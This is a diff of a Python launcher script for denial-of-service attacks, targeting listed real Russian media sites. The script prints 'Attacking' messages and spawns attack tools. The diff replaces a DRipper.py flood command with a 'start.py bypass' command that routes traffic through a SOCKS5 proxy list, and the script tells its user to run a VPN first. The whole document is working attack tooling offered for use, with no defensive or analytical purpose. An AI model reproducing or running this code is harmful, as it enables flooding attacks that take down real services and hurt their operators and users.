@@ -10,7 +10,7 @@ from pprint import pprint
 
 init()
 os.path.join(os.path.dirname(__file__))
-os.environ["PYTHONUNBUFFERED"] = "1"
+
 
 RUNNING = False
 OptionList = [
@@ -20,7 +20,6 @@ OptionList = [
     "www.vesti.ru",
     "www.smotrim.ru",
     "www.vgtrk.ru",
-    "xn--b1aew.xn--p1ai",
 ]
 host = OptionList[0]
 
@@ -55,7 +54,7 @@ def start(thread_number: str):
     time.sleep(2)
     ip = get_ip(hostText)
     print(Fore.RED + f"Attacking {hostText} ({ip})")
-    cmd = f'python DRipper.py -s {ip} -t 135 -p 443'
+    cmd = f'python start.py bypass {hostText} 5 1000 socks5.txt 100 100'
     proc = subprocess.Popen(shlex.split(cmd))
     
     
@@ -89,4 +88,3 @@ if __name__ == '__main__':
     print(Fore.GREEN + "Welcome")
     print(Fore.YELLOW + "Better use vpn before running this app")
     print(Fore.RED + "TO EXIT KILL THIS TAB!!!")
-    main()
